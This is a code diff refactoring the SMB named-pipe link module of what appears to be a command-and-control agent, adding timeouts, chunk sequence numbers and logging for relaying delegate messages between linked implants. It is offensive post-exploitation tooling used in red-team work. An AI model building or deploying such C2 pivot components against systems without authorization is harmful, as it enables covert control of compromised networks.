@@ -17,11 +17,23 @@ namespace Workflow
         private string agent_id { get; set; }
         public string linked_agent_id { get; set; }
         private AutoResetEvent messageSuccess = new AutoResetEvent(false);
-        private ConcurrentDictionary<string, StringBuilder> partialMessages = new ConcurrentDictionary<string, StringBuilder>();
+        private ConcurrentDictionary<string, StringBuilder> partialMessages =
+            new ConcurrentDictionary<string, StringBuilder>();
+        private ConcurrentDictionary<string, int> expectedSequence =
+            new ConcurrentDictionary<string, int>();
         IDataBroker messageManager { get; set; }
         ILogger logger { get; set; }
 
-        public SmbLink(IDataBroker messageManager, ILogger logger, SmbLinkArgs args, string agent_id, string task_id)
+        private const int ConnectionTimeoutMs = 30000;
+        private const int MessageAckTimeoutMs = 15000;
+        private const int ChunkSize = 32768;
+
+        public SmbLink(
+            IDataBroker messageManager,
+            ILogger logger,
+            SmbLinkArgs args,
+            string agent_id,
+            string task_id)
         {
             this.agent_id = agent_id;
             this.messageManager = messageManager;
@@ -36,11 +48,14 @@ namespace Workflow
             {
                 if (this.clientPipe == null || !this.connected)
                 {
-                    // Initialize and configure the client pipe
-                    this.clientPipe = new PipeClient<SmbMessage>(args.pipename, args.hostname);
-                    this.clientPipe.MessageReceived += async (o, args) => await OnMessageReceive(args);
-                    this.clientPipe.Connected += (o, _) => this.connected = true;
-                    this.clientPipe.Disconnected += (o, _) => this.connected = false;
+                    this.clientPipe = new PipeClient<SmbMessage>(
+                        args.pipename, args.hostname);
+                    this.clientPipe.MessageReceived +=
+                        async (o, args) => await OnMessageReceive(args);
+                    this.clientPipe.Connected +=
+                        (o, _) => this.connected = true;
+                    this.clientPipe.Disconnected +=
+                        (o, _) => this.connected = false;
 
                     await clientPipe.ConnectAsync();
 
@@ -48,32 +63,43 @@ namespace Workflow
                     {
                         this.connected = true;
 
-                        // Wait for the agent to provide its UUID
-                        messageSuccess.WaitOne();
+                        if (!messageSuccess.WaitOne(ConnectionTimeoutMs))
+                        {
+                            return new EdgeResponse
+                            {
+                                task_id = task_id,
+                                user_output =
+                                    "Timed out waiting for agent UUID",
+                                completed = true,
+                                edges = new List<Edge>()
+                            };
+                        }
 
                         return new EdgeResponse
                         {
                             task_id = task_id,
-                            user_output = $"Established link with pipe.\r\n{this.agent_id} -> {this.linked_agent_id}",
+                            user_output =
+                                $"Established link with pipe.\r\n" +
+                                $"{this.agent_id} -> " +
+                                $"{this.linked_agent_id}",
                             completed = true,
                             edges = new List<Edge>
+                            {
+                                new Edge
                                 {
-                                    new Edge
-                                    {
-                                        destination = this.linked_agent_id, // Downstream UUID
-                                        source = this.agent_id,            // Current Agent UUID
-                                        action = "add",
-                                        c2_profile = "smb",
-                                        metadata = string.Empty
-                                    }
+                                    destination = this.linked_agent_id,
+                                    source = this.agent_id,
+                                    action = "add",
+                                    c2_profile = "smb",
+                                    metadata = string.Empty
                                 }
+                            }
                         };
                     }
                 }
             }
             catch (Exception e)
             {
-                // Log the exception and return the error response
                 Console.Error.WriteLine($"Error in Link: {e}");
 
                 return new EdgeResponse
@@ -85,7 +111,6 @@ namespace Workflow
                 };
             }
 
-            // Return a failure response if the link couldn't be established
             return new EdgeResponse
             {
                 task_id = task_id,
@@ -95,11 +120,11 @@ namespace Workflow
             };
         }
 
-        private async Task OnMessageReceive(ConnectionMessageEventArgs<SmbMessage> args)
+        private async Task OnMessageReceive(
+            ConnectionMessageEventArgs<SmbMessage> args)
         {
             try
             {
-                // Ensure `linked_agent_id` is initialized
                 if (string.IsNullOrEmpty(linked_agent_id))
                 {
                     linked_agent_id = args.Message.agent_guid;
@@ -112,9 +137,24 @@ namespace Workflow
                         break;
 
                     default:
-                        // Process messages for "checkin" or other cases
-                        var messageBuilder = this.partialMessages.GetOrAdd(args.Message.guid, _ => new StringBuilder());
-                        messageBuilder.Append(args.Message.delegate_message);
+                        string guid = args.Message.guid;
+                        var messageBuilder =
+                            this.partialMessages.GetOrAdd(
+                                guid, _ => new StringBuilder());
+                        int expected =
+                            this.expectedSequence.GetOrAdd(guid, 0);
+
+                        if (args.Message.sequence != expected)
+                        {
+                            DebugLog.Log(
+                                $"SMB link chunk out of order for " +
+                                $"{guid}: expected {expected}, " +
+                                $"got {args.Message.sequence}");
+                        }
+
+                        this.expectedSequence[guid] = expected + 1;
+                        messageBuilder.Append(
+                            args.Message.delegate_message);
 
                         if (args.Message.final)
                         {
@@ -126,7 +166,10 @@ namespace Workflow
                             };
 
                             this.messageManager.AddDelegateMessage(dm);
-                            this.partialMessages.TryRemove(args.Message.guid, out _);
+                            this.partialMessages.TryRemove(
+                                guid, out _);
+                            this.expectedSequence.TryRemove(
+                                guid, out _);
                             messageSuccess.Set();
                         }
                         break;
@@ -134,10 +177,11 @@ namespace Workflow
             }
             catch (Exception ex)
             {
+                DebugLog.Log(
+                    $"SMB link OnMessageReceive error: {ex.Message}");
             }
         }
 
-        //Unlink from the named pipe
         public async Task<bool> Unlink()
         {
             try
@@ -150,60 +194,61 @@ namespace Workflow
 
                 this.connected = false;
                 this.partialMessages.Clear();
+                this.expectedSequence.Clear();
 
                 return true;
             }
             catch (Exception ex)
             {
-                // Optionally log the error for debugging
+                DebugLog.Log($"SMB link Unlink error: {ex.Message}");
                 return false;
             }
             finally
             {
-                // Ensure resources are cleared even if an exception occurs
                 this.connected = false;
                 this.partialMessages.Clear();
+                this.expectedSequence.Clear();
             }
         }
+
         public async Task<bool> ForwardDelegateMessage(DelegateMessage dm)
         {
             try
             {
-                // Precompute parts and the last part for efficiency
-                var parts = dm.message.SplitByLength(4000).ToList();
-                var lastPart = parts.Last();
+                var parts = dm.message
+                    .SplitByLength(ChunkSize).ToList();
 
-                // Create the base SmbMessage with common fields
-                var baseMessage = new SmbMessage
+                string messageGuid = Guid.NewGuid().ToString();
+                for (int i = 0; i < parts.Count; i++)
                 {
-                    guid = Guid.NewGuid().ToString(),
-                    message_type = "chunked_message",
-                    agent_guid = agent_id
-                };
-
-                foreach (var part in parts)
-                {
-                    // Clone the base message and update unique fields
                     var sm = new SmbMessage
                     {
-                        guid = baseMessage.guid,
-                        message_type = baseMessage.message_type,
-                        agent_guid = baseMessage.agent_guid,
-                        delegate_message = part,
-                        final = part == lastPart
+                        guid = messageGuid,
+                        message_type = "chunked_message",
+                        agent_guid = agent_id,
+                        delegate_message = parts[i],
+                        final = (i == parts.Count - 1),
+                        sequence = i,
                     };
 
                     await this.clientPipe.WriteAsync(sm);
 
-                    // Ensure the message was successfully processed
-                    messageSuccess.WaitOne();
+                    if (!messageSuccess.WaitOne(MessageAckTimeoutMs))
+                    {
+                        DebugLog.Log(
+                            $"SMB link ack timeout on chunk {i}/" +
+                            $"{parts.Count}");
+                        return false;
+                    }
                 }
 
                 return true;
             }
             catch (Exception e)
             {
-                // Optionally log the error here
+                DebugLog.Log(
+                    $"SMB link ForwardDelegateMessage error: " +
+                    $"{e.Message}");
                 return false;
             }
         }
